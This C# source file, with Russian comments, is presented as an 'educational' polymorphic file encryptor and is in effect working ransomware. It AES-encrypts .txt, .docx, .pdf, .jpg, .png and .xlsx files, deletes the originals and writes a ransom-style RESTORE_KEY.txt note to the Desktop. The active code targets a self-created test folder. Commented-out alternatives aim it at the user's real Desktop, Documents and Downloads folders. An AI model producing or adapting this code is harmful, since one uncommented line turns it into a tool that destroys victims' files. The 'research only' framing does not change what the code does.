using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Encryptor
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("=== POLYMORPHIC FILE ENCRYPTOR ===");
            Console.WriteLine("Educational Project - For Research Only\n");

            try
            {
                // Генерируем уникальный ключ
                string encryptionKey = GenerateEncryptionKey();
                Console.WriteLine($"🔑 Generated Key: {encryptionKey}");

                // Сохраняем ключ на рабочий стол
                SaveKeyToDesktop(encryptionKey);

                // Шифруем файлы
                int encryptedCount = EncryptTargetFiles(encryptionKey);

                Console.WriteLine($"\n✅ Encryption Complete!");
                Console.WriteLine($"📊 Files encrypted: {encryptedCount}");
                Console.WriteLine($"🔑 Your key saved to Desktop\\RESTORE_KEY.txt");
                Console.WriteLine("\n⚠️  This is an educational demonstration.");
                Console.WriteLine("   Contact your instructor for decryption.");

                Console.WriteLine("\nPress any key to exit...");
                Console.ReadKey();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error: {ex.Message}");
                Console.ReadKey();
            }
        }

        static string GenerateEncryptionKey()
        {
            // 4 разных метода генерации для полиморфизма
            Random random = new Random();
            int method = random.Next(0, 4);

            switch (method)
            {
                case 0: // Base64
                    byte[] key1 = new byte[32];
                    using (var rng = new RNGCryptoServiceProvider())
                        rng.GetBytes(key1);
                    return Convert.ToBase64String(key1);

                case 1: // GUID
                    return Guid.NewGuid().ToString("N") + Guid.NewGuid().ToString("N").Substring(0, 16);

                case 2: // Random string
                    const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < 48; i++)
                        sb.Append(chars[random.Next(chars.Length)]);
                    return sb.ToString();

                case 3: // Hash
                    using (var sha256 = SHA256.Create())
                    {
                        byte[] data = new byte[100];
                        new RNGCryptoServiceProvider().GetBytes(data);
                        byte[] hash = sha256.ComputeHash(data);
                        return BitConverter.ToString(hash).Replace("-", "");
                    }

                default:
                    return "EDU_KEY_" + DateTime.Now.Ticks.ToString("X");
            }
        }

        static void SaveKeyToDesktop(string key)
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string filePath = Path.Combine(desktop, "RESTORE_KEY.txt");

            string message = $"=== FILE ENCRYPTION NOTICE ===\n\n" +
                           $"🔑 ENCRYPTION KEY: {key}\n\n" +
                           $"Your files have been encrypted for educational purposes.\n" +
                           $"This is a demonstration for a computer security course.\n\n" +
                           $"To restore files:\n" +
                           $"1. Contact your instructor\n" +
                           $"2. Provide this key\n" +
                           $"3. You will receive Decryptor.exe\n\n" +
                           $"⚠️  DO NOT DELETE THIS FILE!\n" +
                           $"Key generated: {DateTime.Now}\n" +
                           $"Project: Polymorphic Virus Research";

            File.WriteAllText(filePath, message);
        }

        static int EncryptTargetFiles(string key)
        {
            int totalEncrypted = 0;

            // Целевые папки - ТЕПЕРЬ ПРАВИЛЬНЫЕ ПУТИ
            string[] targetFolders = GetTargetFolders();

            // Расширения файлов для шифрования
            string[] extensions = { ".txt", ".doc", ".docx", ".pdf", ".jpg", ".png", ".xlsx" };

            foreach (string folder in targetFolders)
            {
                if (Directory.Exists(folder))
                {
                    Console.WriteLine($"\n📁 Scanning: {folder}");

                    foreach (string ext in extensions)
                    {
                        try
                        {
                            var files = Directory.GetFiles(folder, $"*{ext}", SearchOption.TopDirectoryOnly);
                            foreach (string file in files)
                            {
                                if (EncryptSingleFile(file, key))
                                {
                                    totalEncrypted++;
                                    Console.WriteLine($"   ✓ {Path.GetFileName(file)}");
                                }
                            }
                        }
                        catch { /* Игнорируем ошибки доступа */ }
                    }
                }
            }

            return totalEncrypted;
        }

        static string[] GetTargetFolders()
        {
            // Правильные пути для разных версий Windows
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            // Путь к папке Downloads (стандартного способа нет)
            string downloads = Path.Combine(userProfile, "Downloads");

            // ТЕСТОВЫЙ ВАРИАНТ (рекомендую для начала):
            // Создаем тестовую папку на рабочем столе
            string testFolder = Path.Combine(desktop, "TEST_ENCRYPTION");
            if (!Directory.Exists(testFolder))
            {
                Directory.CreateDirectory(testFolder);
                CreateTestFiles(testFolder);
            }

            // ВАРИАНТ 1: Только тестовая папка (самый безопасный)
            return new string[] { testFolder };

            // ВАРИАНТ 2: Реальные папки пользователя (осторожно!)
            // return new string[] { 
            //     desktop,
            //     documents,
            //     downloads
            // };

            // ВАРИАНТ 3: Оригинальные пути из задания (могут не существовать)
            // return new string[] {
            //     @"C:\Users\admin\Desktop\files",
            //     @"C:\Users\Nikitos\Desktop\text",
            //     desktop,
            //     documents,
            //     downloads
            // };
        }

        static void CreateTestFiles(string folder)
        {
            // Создаем тестовые файлы
            File.WriteAllText(Path.Combine(folder, "test_document.txt"),
                "This is a test document for encryption demonstration.\n" +
                "Created: " + DateTime.Now.ToString());

            File.WriteAllText(Path.Combine(folder, "notes.docx"),
                "Test Word document content");

            File.WriteAllText(Path.Combine(folder, "budget.xlsx"),
                "Test Excel data");

            File.WriteAllText(Path.Combine(folder, "photo.jpg.txt"),
                "Simulated JPG file");

            File.WriteAllText(Path.Combine(folder, "presentation.pdf.txt"),
                "Simulated PDF file");

            Console.WriteLine($"📝 Created test files in: {folder}");
        }

        static bool EncryptSingleFile(string filePath, string key)
        {
            try
            {
                byte[] fileData = File.ReadAllBytes(filePath);
                byte[] encryptedData = EncryptData(fileData, key);

                // Сохраняем зашифрованный файл
                File.WriteAllBytes(filePath + ".encrypted", encryptedData);

                // Удаляем оригинал
                File.Delete(filePath);

                return true;
            }
            catch
            {
                return false;
            }
        }

        static byte[] EncryptData(byte[] data, string password)
        {
            using (Aes aes = Aes.Create())
            {
                // Генерируем ключ и IV из пароля
                byte[] salt = Encoding.UTF8.GetBytes("EDU_SALT_2025");
                using (var deriveBytes = new Rfc2898DeriveBytes(password, salt, 1000))
                {
                    aes.Key = deriveBytes.GetBytes(32); // 256-bit
                    aes.IV = deriveBytes.GetBytes(16);  // 128-bit
                }

                using (var encryptor = aes.CreateEncryptor())
                using (var ms = new MemoryStream())
                {
                    // Добавляем случайные байты для полиморфизма
                    Random rand = new Random();
                    if (rand.Next(0, 2) == 0)
                    {
                        byte[] garbage = new byte[rand.Next(10, 100)];
                        rand.NextBytes(garbage);
                        ms.Write(garbage, 0, garbage.Length);
                    }

                    using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                        cs.FlushFinalBlock();
                    }

                    return ms.ToArray();
                }
            }
        }
    }
}